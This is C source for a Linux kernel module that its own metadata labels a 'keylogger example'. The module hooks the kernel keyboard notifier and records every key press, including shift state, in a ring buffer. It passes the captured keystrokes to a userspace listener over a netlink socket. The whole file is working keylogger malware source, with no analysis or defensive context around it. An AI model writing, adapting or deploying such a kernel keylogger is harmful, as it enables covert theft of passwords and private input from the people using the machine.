#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/input.h>
#include <linux/init.h>
#include <linux/types.h>
#include <net/sock.h>
#include <linux/netlink.h>

#define NETLINK_TEST 30
#define MSG_LEN 125
#define USER_PORT 100

MODULE_AUTHOR("Dan4ik22");
MODULE_DESCRIPTION("keylogger example");
MODULE_LICENSE("GPL");

struct sock *nlsk = NULL;
extern struct net init_net;
int buffer_for_send[MSG_LEN];

static int count = 0;

int send_usrmsg(int *pbuf, uint16_t len)
{
    struct sk_buff *nl_skb;
    struct nlmsghdr *nlh;
 
    int ret;
 
         /* Создаем пространство sk_buff */
    nl_skb = nlmsg_new(len, GFP_ATOMIC);
    if(!nl_skb)
    {
        printk("netlink alloc failure\n");
        return -1;
    }
 
         /* Устанавливаем заголовок сообщения netlink */
    nlh = nlmsg_put(nl_skb, 0, 0, NETLINK_TEST, len, 0);
    if(nlh == NULL)
    {
        printk("nlmsg_put failaure \n");
        nlmsg_free(nl_skb);
        return -1;
    }
 
         /* Копируем данные и отправляем */
    memcpy(nlmsg_data(nlh), pbuf, len);
    ret = netlink_unicast(nlsk, nl_skb, USER_PORT, MSG_DONTWAIT);
 
    return ret;
}

static void netlink_rcv_msg(struct sk_buff *skb)
{
    struct nlmsghdr *nlh = NULL;
    char *umsg = NULL;
    
    if(skb->len >= nlmsg_total_size(0))
    {
        nlh = nlmsg_hdr(skb);
        umsg = NLMSG_DATA(nlh);
        if(umsg)
        {
            send_usrmsg(buffer_for_send, sizeof(buffer_for_send));
            count = 0;
        }
    }
}

static int keyboard_notifier_call(struct notifier_block *nb, unsigned long action, void *_param)
{
	struct keyboard_notifier_param *param = _param;
	int ret = NOTIFY_OK;

	if (!param->down)
		return ret;
	
    if (param->value > KEY_RESERVED && param->value <= KEY_PAUSE){
		if (param->shift == 1){
			buffer_for_send[count%MSG_LEN] = param->value + 1000;
		}
		else {
			buffer_for_send[count%MSG_LEN] = param->value;
		}
        if (buffer_for_send[count%MSG_LEN] == -1) return ret;
        count++;
	}
	return ret;	
}

static struct notifier_block keyboard_notifier_block = {
	.notifier_call = keyboard_notifier_call, /* set notifier callback */
};

static struct netlink_kernel_cfg cfg = { 
        .input  = netlink_rcv_msg, /* set recv callback */
};  

int init_keylog(void)
{
    for(int i = 0; i < MSG_LEN; i++) buffer_for_send[i] = -1;

    register_keyboard_notifier(&keyboard_notifier_block);
    nlsk = (struct sock *)netlink_kernel_create(&init_net, NETLINK_TEST, &cfg);
    if(nlsk == NULL)
    {   
        printk("netlink_kernel_create error !\n");
        return -1; 
    }
    return 0;
}
 
void exit_keylog(void)
{
    unregister_keyboard_notifier(&keyboard_notifier_block);
    if (nlsk){
        netlink_kernel_release(nlsk); /* release..*/
        nlsk = NULL;
    }   
    printk("klg exit\n");
}

module_init(init_keylog);
module_exit(exit_keylog);